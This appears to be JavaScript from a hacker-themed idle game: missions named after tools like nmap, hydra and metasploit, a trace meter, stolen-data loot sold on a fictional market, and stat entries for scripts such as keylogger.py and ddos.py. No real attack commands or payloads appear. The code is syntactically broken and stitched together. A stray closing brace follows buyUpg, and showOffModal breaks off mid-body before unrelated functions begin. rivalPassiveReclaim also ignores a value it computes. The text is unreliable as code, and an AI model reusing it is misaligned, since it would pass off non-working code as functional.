    ticks++; const pct=Math.min(100,(ticks/totalTicks)*100);
    G.missionProgress=pct; updatePct(pct);
    // Heat during processing (30% of typing rate)
    if(tmpl2) addHeat((tmpl2.hPC||.05)*0.5*(tickMs/1000));
    if(pct>=100){clearInterval(procInt);clearInterval(cdownInt);stopAmbient();completeMission();}
  },tickMs);
}

function resumeProc(mission,template,slow=1){
  const rem=(1-G.missionProgress/100);
  const secs=getProcSecs(template)*rem*slow;
  startProcInt(secs,1); startCdown(Math.ceil(secs));
}

function startCdown(secs){
  clearInterval(cdownInt); let t=secs;
  const e=el('countdown'); e.className='countdown on'; e.textContent=`[ ${t}s ]`;
  cdownInt=setInterval(()=>{t--;if(t<=0){clearInterval(cdownInt);e.className='countdown';}else e.textContent=`[ ${t}s ]`;},1000);
}

function setupPrestage(){
  if(G.missionQueue.length===0){el('prestage').className='prestage';return;}
  const nid=G.missionQueue[0];
  const nt=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===nid);
  if(!nt)return;
  const nm=genMission(nt);
  const idx=MISSIONS.findIndex(m=>m.id===nid);
  if(idx>=0)MISSIONS[idx]=nm;
  PS.command=nm.command; PS.typed=0; renderPS();
  el('prestage-lbl').textContent='// STAGING: '+nt.name;
  el('prestage').className='prestage on';
  if(G.typingTier>=3){
    const aps=setInterval(()=>{if(G.phase!=='process'){clearInterval(aps);return;}if(PS.typed>=PS.command.length){clearInterval(aps);return;}PS.typed=Math.min(PS.typed+3,PS.command.length);renderPS();},200);
  }
}

function tapPS(){
  if(G.phase!=='process'||PS.typed>=PS.command.length)return false;
  PS.typed=nextPos(PS); renderPS(); playKey(); return true;
}

// ═══════════════════════════════════════════════
// COMPLETE / ABORT
// ═══════════════════════════════════════════════
function completeMission(){
  if(!G.missionRunning)return;
  const allM=[...MISSIONS,...FACTION_MISSIONS];
  const mission=allM.find(m=>m.id===G.activeMission);
  const allT=[...MT,...Object.values(FACTION_MT).flat()];
  const template=allT.find(t=>t.id===G.activeMission);
  if(!mission||!template)return;

  // Intel drop from recon
  if(template.drops==='intel'){
    G.knownTargets[mission.id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user,corp:mission._corp};
    ['hydra_ssh','scp_exfil','metasploit','ssh_backdoor','worm_deploy'].forEach(id=>{if(!G.knownTargets[id])G.knownTargets[id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user,corp:mission._corp};});
    log(`> INTEL: ${mission._corp} (${mission._ip}) mapped. Follow-ups get bonuses.`,'info');
    // Sector-aware node reveal — reveals one unknown node in current sector
    onReconComplete();
  }

  // Mark node as scanned/owned on map
  if(template.reward.passive){
    const nodeKey=mission.id==='worm_deploy'?'cipher_node':mission.id==='ssh_backdoor'?'corp_db':'market';
    if(G.networkNodes[nodeKey])G.networkNodes[nodeKey].status='owned';
    log(`> NODE OWNED: passive income active`,'ok');
  }

  // Economy v2: small direct reward + loot listed on darkweb market
  const base=template.reward.base;
  const scale=1+G.missionsCompleted*.05;
  const factionBonus=G.faction?1.15:1;
  const penMult=intState.rewardHalved?.5:1;
  // 20% paid direct, 80% goes to market as loot
  const directEarned=Math.floor(base*0.2*G.rep*scale*factionBonus*penMult);
  G.credits+=directEarned; G.totalCreditsEarned=(G.totalCreditsEarned||0)+directEarned;
  G.missionsCompleted++;
  onMissionCompletedInSector(G.activeMission);
  checkNarrative();

  // Generate loot for market
  const loot=generateLoot(G.activeMission, mission._corp);
  const lootVal=loot?loot.qty*loot.valueEach:0;
  const lootStr=loot?` | ${fmtNum(loot.qty)} ${loot.label} → MARKET`:'';

  onTutPhase2Done();
  log(`> ✓ ${mission.name} — $${fmtNum(directEarned)} cash${lootStr}`+(intState.rewardHalved?' [PENALTY]':''),'ok');
  if(loot){
    const stacked=G.lootInventory.find(l=>l.type===LOOT_TABLE[G.activeMission]?.type);
    const stackNote=stacked&&stacked.qty>loot.qty?` (stacked — total: ${fmtNum(stacked.qty)} units)`:'';
    log(`> MARKET: $${fmtNum(lootVal)} of ${loot.label} listed at $${loot.valueEach.toFixed(2)}/unit${stackNote}`,'dim');
  }
  if(template.reward.passive)log(`> PASSIVE NODE: income dripping`,'ok');
  playOK(); showFloat(directEarned); addHeat(template.hOC||5);

  G.missionRunning=false; G.phase=null; G.activeMission=null; G.missionProgress=0;
  TS.command=''; TS.typed=0; PS.command=''; PS.typed=0;
  clearInterval(procInt); clearInterval(cdownInt); stopAmbient();
  el('cmdtxt').textContent='';
  el('progwrap').classList.remove('on'); el('phlbl').className='phlbl';
  el('countdown').className='countdown'; el('prestage').className='prestage';

  const btn=el('tapbtn'); btn.classList.add('locked'); tapCD=true;
  setTimeout(()=>{
    btn.classList.remove('locked'); tapCD=false; updateUI();
    if(G.missionQueue.length>0){const nid=G.missionQueue.shift();updateQdisp();selectMission(nid,true);}
    else if(G.typingTier>=3)autoStartBest();
    else updateTapBtn();
  },700);
  updateUI();
}

function abortMission(){
  if(!G.activeMission)return;
  clearInterval(procInt); clearInterval(cdownInt); clearInterval(intTimerInt); stopAmbient();
  el('int-ov').classList.remove('on'); intState.active=false; intState.processPaused=false;
  log('> MISSION ABORTED','warn');
  G.missionRunning=false; G.phase=null; G.activeMission=null; G.missionProgress=0;
  TS.command=''; TS.typed=0; PS.command=''; PS.typed=0;
  el('cmdtxt').textContent='';
  el('progwrap').classList.remove('on'); el('phlbl').className='phlbl';
  el('countdown').className='countdown'; el('prestage').className='prestage';
  updateTapBtn(); updateUI();
}

// ═══════════════════════════════════════════════
// SELECT / QUEUE
// ═══════════════════════════════════════════════
function selectMission(id,usePS=false){
  const allT=[...MT,...Object.values(FACTION_MT).flat()];
  const template=allT.find(t=>t.id===id); if(!template)return;
  const[minM,minC]=template.unlockAt;
  if(G.missionsCompleted<minM||G.credits<minC)return;
  if(G.missionRunning){
    const slots=G.maxQueueSize-1;
    if(G.missionQueue.length>=slots){log(`> Queue full`,'warn');return;}
    if(G.missionQueue.includes(id)){log(`> Already queued`,'dim');return;}
    G.missionQueue.push(id); updateQdisp();
    log(`> QUEUED: ${template.name}`,'info');
    renderPanel('missions'); return;
  }
  let mission;
  const allM=[...MISSIONS,...FACTION_MISSIONS];
  const existing=allM.find(m=>m.id===id);
  if(usePS&&PS.command&&existing?.command===PS.command){mission=existing;}
  else{
    mission=genMission(template);
    const idx=MISSIONS.findIndex(m=>m.id===id);
    if(idx>=0)MISSIONS[idx]=mission;
    else{const fi=FACTION_MISSIONS.findIndex(m=>m.id===id);if(fi>=0)FACTION_MISSIONS[fi]=mission;}
  }
  G.activeMission=id; G.missionRunning=true;
  onTutMissionSelected();
  logSep();
  log(`> INITIATING: ${mission.name}`,'info');
  log(`> TARGET: ${mission._corp} (${mission._ip})`,'dim');
  log(`> CMD: ${mission.command}`,'dim');
  if(mission._intelBonus)log(`> INTEL ACTIVE: reduced heat + faster process`,'info');
  log(`> Est. process: ~${Math.ceil(getProcSecs(template))}s [${dLbl(template.driver)}]`,'dim');
  logSep();
  showPanel('none'); playModem();
  if(usePS&&PS.typed>0&&PS.command===mission.command){
    TS.command=mission.command; TS.typed=PS.typed; PS.command=''; PS.typed=0;
    G.phase='type';
    el('phlbl').textContent='// PHASE 1: EXECUTE COMMAND'; el('phlbl').className='phlbl on';
    el('progwrap').classList.add('on'); el('proglbl').textContent='TYPING'; el('progfill').className=''; el('progpct').style.color='#00ff41';
    el('prestage').className='prestage'; renderCmd();
    const pct=(TS.typed/TS.command.length)*100; updatePct(pct);
    if(TS.typed>=TS.command.length)setTimeout(()=>startProcPhase(mission),350);
    else updateTapBtn();
  }else startTypePhase(mission);
}

function autoStartBest(){
  const allT=[...MT,...(G.faction?FACTION_MT[G.faction]:[])];
  const av=allT.filter(t=>{const[m,c]=t.unlockAt;return G.missionsCompleted>=m&&G.credits>=c;});
  if(av.length)selectMission(av[av.length-1].id);
}

function updateQdisp(){
  const e=el('qind'),d=el('qdisplay');
  if(G.missionQueue.length===0){e.classList.remove('on');return;}
  e.classList.add('on');
  d.textContent=G.missionQueue.map(id=>{const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===id);return t?t.name.split(':')[0].trim():id;}).join(' → ');
}

// ═══════════════════════════════════════════════
// TAP
// ═══════════════════════════════════════════════
function handleTap(){
  if(tapCD||intState.active)return;
  if(G.phase==='process'){if(tapPS())return;return;}
  if(!G.missionRunning||!G.activeMission)return;
  if(G.heat>=100){log('> TRACE DETECTED — lay low','err');playFail();return;}
  tapType(); tapCD=true; setTimeout(()=>tapCD=false,40);
}

function updateTapBtn(){
  const btn=el('tapbtn');
  if(!G.missionRunning){btn.textContent='[ SELECT MISSION ]';btn.className='none';return;}
  if(G.phase==='process'){
    const allT=[...MT,...Object.values(FACTION_MT).flat()];
    const t=allT.find(t=>t.id===G.activeMission);
    const hasPS=G.missionQueue.length>0&&PS.typed<PS.command.length;
    btn.textContent=hasPS?'[ TAP TO PRE-STAGE ]':`[ ${dTag(t?.driver||'cpu')} PROCESSING... ]`;
    btn.className=hasPS?'':'proc'; return;
  }
  if(G.typingTier>=3){btn.textContent='[ AUTO-EXECUTING ]';btn.className='idle';return;}
  if(G.typingTier===2){btn.textContent='[ TAP TO RUN COMMAND ]';btn.className='';return;}
  btn.textContent=G.typingTier===1?'[ TAP TO AUTOCOMPLETE ]':'[ TAP TO TYPE ]'; btn.className='';
}

// ═══════════════════════════════════════════════
// AUTO TICK
// ═══════════════════════════════════════════════
function startAutoTick(){
  if(autoInt)return;
  log('> SCHEDULER ONLINE — autonomous mode','info');
  autoInt=setInterval(()=>{
    if(!G.missionRunning){autoStartBest();return;}
    if(G.phase!=='type'||G.heat>=100)return;
    const total=TS.command.length; if(!total)return;
    const allM=[...MISSIONS,...FACTION_MISSIONS];
    const m=allM.find(m=>m.id===G.activeMission); if(!m)return;
    const adv=Math.max(2,Math.floor(getBWT()*1.5));
    TS.typed=Math.min(TS.typed+adv,total); renderCmd();
    const pct=Math.min(100,(TS.typed/total)*100); G.missionProgress=pct; updatePct(pct);
    addHeat((m.hPC||.04)*adv);
    if(TS.typed>=total)setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},300);
  },350);
}

// ═══════════════════════════════════════════════
// HEAT  (faster accumulation, slower decay)
// ═══════════════════════════════════════════════
function getHM(){let m=1;if((G.upgrades.lat1||0)>=1)m*=.75;if((G.upgrades.lat2||0)>=1)m*=.5;if((G.upgrades.lat3||0)>=1)m*=.25;return m;}
function addHeat(amt){
  const prev=G.heat;
  G.heat=Math.min(100,G.heat+amt*getHM()); updateHD();
  // Pulse trace bar at thresholds
  if(prev<50&&G.heat>=50||prev<75&&G.heat>=75){
    const trk=el('htrk'); trk.classList.remove('pulse');
    void trk.offsetWidth; trk.classList.add('pulse');
    setTimeout(()=>trk.classList.remove('pulse'),400);
  }
  if(G.heat>=100){log('> ⚠ TRACE COMPLETE — burned!','err');playFail();abortMission();G.heat=78;updateHD();}
}
function updateHD(){
  const p=G.heat,f=el('hfill');
  f.style.width=p+'%'; el('hpct').textContent=Math.floor(p)+'%';
  f.style.background=p>=70?'#ff2d2d':p>=40?'#ffb700':'#00ff41';
}
// Slower decay — creates more tension
setInterval(()=>{
  if(G.heat<=0||intState.active)return;
  const dm=(G.upgrades.dec1||0)>=1&&!G.missionRunning?2:1;
  G.heat=Math.max(0,G.heat-.25*dm); updateHD();
},500);

function buyUpg(id){
  const u=UPG.find(u=>u.id===id); if(!u)return;
  const lvl=G.upgrades[id]||0; if(lvl>=u.mx)return;
  if(!u.cond()){log('> Prerequisites not met.','warn');return;}
  const cost=u.cost(lvl);
  if(G.credits<cost){log(`> Need $${fmtNum(cost)}`,'warn');playFail();return;}
  G.credits-=cost; G.upgrades[id]=lvl+1; u.apply();
  log(`> INSTALLED: ${u.name}`,'ok'); playOK(); updateUI(); renderPanel('upgrades');
}

}

// ═══════════════════════════════════════════════
// PIPELINE RENDERER
// Shows the hacker attack chain with current progress
// ═══════════════════════════════════════════════
function renderPipeline(container){
  // Pipeline steps — which missions fulfill each stage
  const stages=[
    {label:'RECON',    icon:'01', ids:['nmap_scan','nc_listen'],           desc:'Map the target. Reveal nodes.'},
    {label:'EXPLOIT',  icon:'02', ids:['hydra_ssh','john_crack','aircrack','metasploit'], desc:'Gain access. Crack credentials.'},
    {label:'EXFIL',    icon:'03', ids:['scp_exfil','sqlmap'],              desc:'Pull data. Fill market listings.'},
    {label:'PERSIST',  icon:'04', ids:['ssh_backdoor','worm_deploy'],      desc:'Own the node. Passive income.'},
  ];

  const wrap=document.createElement('div');
  wrap.style.cssText='padding:8px 10px;border-bottom:1px solid #1a3a1a;';

  // Check which stages player has completed at least once
  const completedMissions=new Set(Object.keys(G.knownTargets));
  // Also count by mission type completions via missionsCompleted
  const stageStatus=stages.map(st=>{
    const hasAny=st.ids.some(id=>G.knownTargets[id]||
      (G.missionsCompleted>0 && G.upgrades['bw1']&&st.label==='RECON')||
      (G.missionsCompleted>=3&&st.label==='EXPLOIT')||
      (G.missionsCompleted>=8&&st.label==='EXFIL')||
      (G.missionsCompleted>=20&&st.label==='PERSIST'));
    // A stage is active if its missions are unlocked
    const isUnlocked=st.ids.some(id=>{
      const t=MT.find(t=>t.id===id);
      return t&&G.missionsCompleted>=t.unlockAt[0]&&G.credits>=t.unlockAt[1];
    });
    return{...st, done:hasAny, unlocked:isUnlocked};
  });

  // Render as horizontal chain
  const chain=document.createElement('div');
  chain.style.cssText='display:flex;align-items:center;gap:4px;margin-bottom:6px;overflow-x:auto;padding-bottom:2px;';
  stageStatus.forEach((st,i)=>{
    const step=document.createElement('div');
    const active=G.activeMission&&st.ids.includes(G.activeMission);
    const col=active?'#00ff41':st.done?'#ffb700':st.unlocked?'#4a7a4a':'#1a3a1a';
    step.style.cssText=`flex-shrink:0;padding:4px 8px;border:1px solid ${col};border-radius:3px;font-size:9px;color:${col};letter-spacing:1px;background:${active?'rgba(0,255,65,.1)':'transparent'};`;
    step.innerHTML=`<span style="opacity:.6">${st.icon}</span> ${st.label}${st.done?' ✓':''}${active?' ◄':''}`;
    step.title=st.desc;
    chain.appendChild(step);
    if(i<stageStatus.length-1){
      const arrow=document.createElement('span');
      arrow.style.cssText=`color:${stageStatus[i+1].unlocked?'#4a7a4a':'#1a3a1a'};font-size:10px;flex-shrink:0;`;
      arrow.textContent='→';
      chain.appendChild(arrow);
    }
  });
  wrap.appendChild(chain);

  // Active stage description
  const activeStage=stageStatus.find(s=>G.activeMission&&s.ids.includes(G.activeMission))||
                    stageStatus.find(s=>s.unlocked&&!s.done)||
                    stageStatus[stageStatus.length-1];
  if(activeStage){
    const hint=document.createElement('div');
    hint.style.cssText='font-size:10px;color:#4a7a4a;';
    const nextStage=stageStatus.find(s=>!s.done&&s.unlocked);
    if(nextStage&&nextStage!==activeStage){
      hint.innerHTML=`Next: <span style="color:#ffb700">${nextStage.label}</span> — ${nextStage.desc}`;
    } else if(activeStage.done){
      const marketPending=(G.lootInventory||[]).reduce((a,l)=>a+l.qty*l.valueEach,0);
      hint.innerHTML=marketPending>0
        ?`MARKET: $${fmtNum(marketPending)} pending. <span style="color:#ffb700">Tap MKT to view.</span>`
        :`Pipeline active. Keep running ops to fill the market.`;
    } else {
      hint.innerHTML=`<span style="color:#ffb700">${activeStage.label}:</span> ${activeStage.desc}`;
    }
    wrap.appendChild(hint);
  }

  container.appendChild(wrap);
}

function calcOff(secs){
  if(secs<30)return null;
  const mins=Math.min(Math.floor(secs/60),480);
  const cappedSecs=mins*60;

  // Script/node passive income (existing)
  const t=MT[Math.min(Math.floor(G.missionsCompleted/10),MT.length-1)];
  const passiveEarned=Math.floor(t.reward.base*G.rep/2*mins*.2);

  // Market offline sales — simulate market ticks that did not happen
  let marketEarned=0;
  const marketLog=[];
  if(G.lootInventory&&G.lootInventory.length>0){
    const bwMult=Math.log2(G.bandwidth/56+1)*0.5+0.5;
    const ticksOffline=Math.floor(cappedSecs/2); // 2s tick rate
    G.lootInventory.forEach(loot=>{
      if(loot.qty<=0)return;
      const sellRate=Math.max(0.5,bwMult*(loot.qty>1000?2:1));
      const mult=getLootValueMult(loot.type);
      // How many units sold while away
      const unitsSold=Math.min(loot.qty,Math.floor(sellRate*ticksOffline));
      const earned=unitsSold*loot.valueEach*mult;
      if(earned>0){
        marketEarned+=earned;
        marketLog.push({label:loot.label,qty:unitsSold,earned});
        loot.qty-=unitsSold;
        loot.totalValue=loot.qty*loot.valueEach;
      }
    });
    // Clean out empty listings
    G.lootInventory=G.lootInventory.filter(l=>l.qty>0);
    G.marketEarnings=(G.marketEarnings||0)+marketEarned;
  }

  const totalEarned=passiveEarned+Math.floor(marketEarned);
  if(totalEarned<=0)return null;
  return{mins,passiveEarned,marketEarned:Math.floor(marketEarned),marketLog,totalEarned};
}

function showOffModal(g){
  if(!g||g.totalEarned<=0)return;
  G.credits+=g.totalEarned;

  let html=`<div>Away: <span class="hi">${g.mins}min</span></div>`;
  if(g.passiveEarned>0){
    html+=`<div>Passive nodes: <span class="hi">+$${fmtNum(g.passiveEarned)}</span></div>`;
  }
  if(g.marketEarned>0){
    html+=`<div>Market sales: <span class="hi">+$${fmtNum(g.marketEarned)}</span></div>`;
    // Show breakdown of what sold
    g.marketLog.forEach(m=>{
      html+=`<div style="padding-left:8px;color:#4a7a4a;">${fmtNum(m.qty)} ${m.label} → $${fmtNum(m.earned)}</div>`;
    });

function getSectorMissions(sectorId){
  // Each sector has a subset of missions appropriate to its tier
  const pools={
    0:['nmap_scan','john_crack','hydra_ssh'],
    1:['nc_listen','scp_exfil','aircrack'],
    2:['sqlmap','metasploit'],
    3:['ssh_backdoor','cipher_darkweb','ghost_corp'],
    4:['worm_deploy'],
  };
  return pools[sectorId]||[];
}

function canUnlockSector(id){
  if(id===0)return true;
  const prev=SECTORS[id-1];
  const sp=G.sectorProgress[id-1]||{missions:0,owned:0};
  const req=SECTORS[id].req;
  // Faction gate for sector 3
  if(id===3&&!G.faction)return false;
  return sp.missions>=req.missions && sp.owned>=req.owned && G.credits>=req.credits;
}

function tryUnlockSectors(){
  SECTORS.forEach(s=>{
    if(!G.unlockedSectors.includes(s.id)&&canUnlockSector(s.id)){
      G.unlockedSectors.push(s.id);
      log(`> SECTOR UNLOCKED: ${s.name}`,'info');
      logMsg(`> New sector accessible: ${s.name}. Expand your territory.`,'info');
    }
  });
}

function onMissionCompletedInSector(missionId){
  const sector=G.currentSector;
  if(!G.sectorProgress[sector])G.sectorProgress[sector]={missions:0,owned:0};
  G.sectorProgress[sector].missions++;
  tryUnlockSectors();
}

function countOwnedInSector(sectorId){
  // Simplified: total owned nodes counts toward all sectors
  return Object.values(G.networkNodes||{}).filter(n=>n.status==='owned').length;
}

const RIVAL_NODES=['axiom_db','fed_node','market','cipher_node','interpol'];

function initRivalNodes(){
  // Only set rivals in sector 1+ when those sectors are unlocked/visible.
  // Sector 0 (local net) is always yours — no rivals.
  // Rivals are seeded when a sector is first entered (unlocked).
  // This is called when unlocking sector 1+.
  if(G.unlockedSectors.includes(1)){
    if(G.networkNodes.corp_db&&G.networkNodes.corp_db.status==='scanned')
      G.networkNodes.corp_db.status='rival_cipher';
  }
  if(G.unlockedSectors.includes(2)){
    if(G.networkNodes.interpol&&G.networkNodes.interpol.status==='scanned')
      G.networkNodes.interpol.status='rival_gov';
  }
  if(G.unlockedSectors.includes(3)){
    if(G.networkNodes.market&&G.networkNodes.market.status==='scanned')
      G.networkNodes.market.status='rival_ghost';
  }
}

function rivalPassiveReclaim(){
  // Rivals slowly try to reclaim your nodes — 1 node per ~10 min
  const yourNodes=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status==='owned');
  if(yourNodes.length<=2)return; // skip reclaim if only 2 nodes
  const target=yourNodes[rnd(0,yourNodes.length-1)];
  if(!target)return;
  const rival=G.faction==='cipher'?'rival_ghost':'rival_cipher';
  G.networkNodes[target[0]].status='rival_cipher';
  logMsg(`> RIVAL RECLAIM: ${target[1].name||target[0]} taken by rival faction. Attack it back.`,'warn');
  G.msgUnread=true; el('msg-badge').style.display='inline';
}

function triggerRivalRaid(){
  if(!G.missionRunning||intState.active)return;
  if(G.phase!=='process')return;
  // Fire a special interrupt
  const raidInt={
    id:'rival_raid',
    title:'⚠ RIVAL FACTION RAID',
    body:'A rival operator is attacking your node. Tap to defend before it falls.',
    type:'timed_tap',timer:10,
    tapLabel:'[ DEFEND NODE ]',
    successMsg:'Node defended. Rival repelled.',
    failMsg:'Node lost to rival faction.',
    heatOnFail:10,
    cond:()=>true,
  };
  fireInterrupt(raidInt);
}

const SCRIPT_DEFS=[
  {id:'keylogger',  name:'keylogger.py',   cr_s:2,   heat_s:.04, ram:1, desc:'Credit drip from owned node.',   req:0},
  {id:'portscanner',name:'portscanner.sh', cr_s:0,   heat_s:0,   ram:1, desc:'Passive recon. Reveals sector intel.', req:0},
  {id:'sniffer',    name:'sniffer.py',     cr_s:0,   heat_s:.02, ram:1, desc:'Reveals locked sector nodes.',   req:5},
  {id:'miner',      name:'miner.sh',       cr_s:8,   heat_s:.28, ram:2, desc:'High yield crypto mining. Hot.', req:10},
  {id:'ddos',       name:'ddos.py',        cr_s:0,   heat_s:.14, ram:2, desc:'Attacks rival nodes auto.',      req:20, attacks:true},
];

function getScriptSlots(){return Math.max(1,Math.floor(G.ram/512));}
function getUsedSlots(){return (G.deployedScripts||[]).filter(s=>s.active).reduce((acc,s)=>{const def=SCRIPT_DEFS.find(d=>d.id===s.scriptId);return acc+(def?.ram||1);},0);}
function isScriptUnlocked(def){return G.missionsCompleted>=def.req;}

function deployScript(scriptId,nodeId){
  const def=SCRIPT_DEFS.find(d=>d.id===scriptId); if(!def)return;
  const used=getUsedSlots(), slots=getScriptSlots();
  if(used+def.ram>slots){log(`> No RAM slots available (${used}/${slots} used)`,'warn');return;}
  if(!G.deployedScripts)G.deployedScripts=[];
  const existing=G.deployedScripts.find(s=>s.scriptId===scriptId&&s.nodeId===nodeId);
  if(existing){existing.active=!existing.active;log(`> ${existing.active?'STARTED':'STOPPED'}: ${def.name}`,'ok');}
  else{G.deployedScripts.push({scriptId,nodeId,active:true});log(`> DEPLOYED: ${def.name}`,'ok');}
  playOK(); renderPanel('scripts');
}

// Script tick — runs every 2 seconds
function scriptTick(){
  if(!G.deployedScripts)return;
  const ownedNodes=Object.keys(G.networkNodes||{}).filter(k=>G.networkNodes[k].status==='owned');
  if(ownedNodes.length===0)return;
  let totalCr=0, totalHeat=0;
  G.deployedScripts.forEach(s=>{
    if(!s.active)return;
    const def=SCRIPT_DEFS.find(d=>d.id===s.scriptId); if(!def)return;
    // Auto-assign to first owned node if no specific node
    const targetNode=s.nodeId||ownedNodes[0];
    if(!ownedNodes.includes(targetNode)){s.active=false;return;}
    totalCr+=def.cr_s*2; // 2s tick
    totalHeat+=def.heat_s*2;
    // DDoS auto-attacks rival nodes
    if(def.attacks&&Math.random()<.05){
      const rivals=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status.startsWith('rival'));
      if(rivals.length){
        const target=rivals[rnd(0,rivals.length-1)];
        G.networkNodes[target[0]].status='scanned';
        logMsg(`> DDoS: ${target[1].name||target[0]} taken offline by ddos.py`,'ok');
        G.msgUnread=true; el('msg-badge').style.display='inline';
      }
    }
    // Port scanner reveals sector nodes
    if(def.id==='portscanner'&&Math.random()<.02)onReconComplete();
  });
  if(totalCr>0){G.credits+=totalCr*G.rep;updateUI();}
  if(totalHeat>0)addHeat(totalHeat);
}

function renderScripts(container){
  // Section divider when rendered inside market panel
  const divider=document.createElement('div');
  divider.style.cssText='padding:8px 12px 3px;font-size:9px;color:#4a7a4a;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a3a1a;margin-top:6px;';
  divider.textContent='// DEPLOYED SCRIPTS';
  container.appendChild(divider);
  // Slot bar
  const used=getUsedSlots(), slots=getScriptSlots();
  const slotBar=document.createElement('div'); slotBar.className='slot-bar';
  let pips='';
  const active=G.deployedScripts?.filter(s=>s.active)||[];
  for(let i=0;i<slots;i++){
    // Check if slot is used by miner (yellow)
    const si=i<used;
    const isMiner=si&&active[i]?.scriptId==='miner';
    pips+=`<div class="slot-pip ${si?('used'+(isMiner?' mining':'')):''}"></div>`;
  }
  slotBar.innerHTML=`<div style="color:#4a7a4a;margin-bottom:4px;">RAM SLOTS: <span style="color:#00ff41">${used}/${slots}</span> used (${G.ram>=1024?(G.ram/1024).toFixed(0)+'GB':G.ram+'MB'} RAM)</div><div class="slot-track">${pips}</div>`;
  container.appendChild(slotBar);

  // Owned nodes list
  const owned=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status==='owned');
  if(owned.length===0){
    const tip=document.createElement('div');
    tip.style.cssText='margin:8px 10px;padding:10px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;';
    tip.textContent='Own nodes by completing WORM DEPLOY or SSH BACKDOOR missions. Scripts deploy against owned nodes.';
    container.appendChild(tip); return;
  }

  // Script list
  SCRIPT_DEFS.forEach(def=>{
    const unlocked=isScriptUnlocked(def);
    const deployed=G.deployedScripts?.find(s=>s.scriptId===def.id&&s.active);
    const card=document.createElement('div'); card.className=`script-card ${deployed?'deployed':''}`;
    const stats=[];
    if(def.cr_s>0)stats.push(`+$${def.cr_s}/s`);
    if(def.heat_s>0)stats.push(`heat: +${def.heat_s}/s`);
    if(def.attacks)stats.push('auto-attacks rivals');
    stats.push(`${def.ram} RAM slot${def.ram>1?'s':''}`);
    card.innerHTML=`
      <div class="script-info">
        <div class="script-name">${def.name}</div>
        <div class="script-desc">${def.desc}</div>
        <div class="script-stats">${stats.join(' | ')}${!unlocked?' | 🔒 '+def.req+' missions':''}</div>
      </div>`;
    if(unlocked){
      const btn=document.createElement('button'); btn.className=`script-btn ${deployed?'active':''}`;
      btn.textContent=deployed?'STOP':'RUN';
      btn.onclick=()=>deployScript(def.id, owned[0]?.[0]);
      card.appendChild(btn);
    }
    container.appendChild(card);
  });

  // Active scripts summary
  if((G.deployedScripts||[]).filter(s=>s.active).length>0){
    const summ=document.createElement('div');
    summ.style.cssText='margin:8px 10px;padding:8px;border:1px solid #003a0f;border-radius:4px;font-size:10px;color:#4a7a4a;background:rgba(0,255,65,.03);';
    const activeS=G.deployedScripts.filter(s=>s.active);
    const totalCrS=activeS.reduce((a,s)=>{const d=SCRIPT_DEFS.find(d=>d.id===s.scriptId);return a+(d?.cr_s||0);},0);
    const totalHS=activeS.reduce((a,s)=>{const d=SCRIPT_DEFS.find(d=>d.id===s.scriptId);return a+(d?.heat_s||0);},0);
    summ.innerHTML=`<div style="color:#00ff41;margin-bottom:3px;">ACTIVE SCRIPTS: ${activeS.length}</div><div>Income: +$${totalCrS.toFixed(1)}/s | Heat: +${totalHS.toFixed(2)}/s</div>`;
    container.appendChild(summ);
  }
}

// Loot definition per mission
const LOOT_TABLE={
  nmap_scan:      {type:'target_intel',   label:'Target Intel',      qty:()=>1,           val:()=>25},
  john_crack:     {type:'cracked_hashes', label:'Cracked Hashes',    qty:()=>rnd(50,500), val:()=>0.08},
  hydra_ssh:      {type:'ssh_creds',      label:'SSH Credentials',   qty:()=>rnd(1,10),   val:()=>12},
  nc_listen:      {type:'shell_access',   label:'Shell Access',      qty:()=>1,           val:()=>45},
  scp_exfil:      {type:'data_records',   label:'Data Records',      qty:()=>rnd(10000,500000), val:()=>0.04},
  aircrack:       {type:'wifi_keys',      label:'WiFi Keys',         qty:()=>rnd(1,5),    val:()=>8},
  sqlmap:         {type:'db_records',     label:'DB Records',        qty:()=>rnd(5000,200000), val:()=>0.06},
  metasploit:     {type:'root_access',    label:'Root Access',       qty:()=>1,           val:()=>180},
  ssh_backdoor:   {type:'persist_access', label:'Persistent Access', qty:()=>1,           val:()=>95},
  worm_deploy:    {type:'botnet_node',    label:'Botnet Node',       qty:()=>1,           val:()=>0},
  cipher_darkweb: {type:'btc_keys',       label:'BTC Wallet Keys',   qty:()=>rnd(1,8),    val:()=>220},
  ghost_corp:     {type:'corp_intel',     label:'Corp Intelligence', qty:()=>rnd(5,20),   val:()=>18},
};

// Faction price bonuses
function getLootValueMult(lootType){
  let m=1;
  if(G.faction==='cipher'&&['ssh_creds','root_access','persist_access','btc_keys'].includes(lootType))m*=1.3;
  if(G.faction==='ghost'&&['data_records','db_records','corp_intel','target_intel'].includes(lootType))m*=1.3;
  // Heat spoils market — buyers nervous
  if(G.heat>70)m*=0.5;
  else if(G.heat>50)m*=0.8;
  // Rep multiplier
  m*=G.rep;
  return m;
}

// Add loot to inventory — stacks same type into existing listing
function generateLoot(missionId, corp){
  const def=LOOT_TABLE[missionId]; if(!def)return null;
  const qty=def.qty();
  const val=def.val();
  if(val===0)return null;
  if(!G.lootInventory)G.lootInventory=[];

  // Stack into existing listing of same type if one exists
  const existing=G.lootInventory.find(l=>l.type===def.type);
  if(existing){
    existing.qty+=qty;
    existing.totalValue=existing.qty*existing.valueEach;
    // Update source to reflect latest addition
    existing.source=corp||existing.source;
    return existing; // return the stacked item
  }

  // No existing listing — create new one
  const loot={
    id:randHash(), type:def.type, label:def.label,
    qty, valueEach:val, source:corp||'UNKNOWN',
    listedAt:Date.now(), totalValue:qty*val,
  };
  G.lootInventory.push(loot);
  return loot;
}

// Market tick — runs every 2s, drains loot into credits
function marketTick(){
  if(!G.lootInventory||G.lootInventory.length===0){
    updateMarketTicker(0,0);
    return;
  }
  // Sell rate: bandwidth determines how fast listings clear
  // 56k = 0.5 units/s base, scales with BW
  const bwMult=Math.log2(G.bandwidth/56+1)*0.5+0.5; // smooth BW scaling
  let totalEarned=0, totalPending=0;
  const toRemove=[];

  G.lootInventory.forEach((loot,idx)=>{
    const sellRate=Math.max(0.5, bwMult*(loot.qty>1000?2:1)); // big dumps sell faster
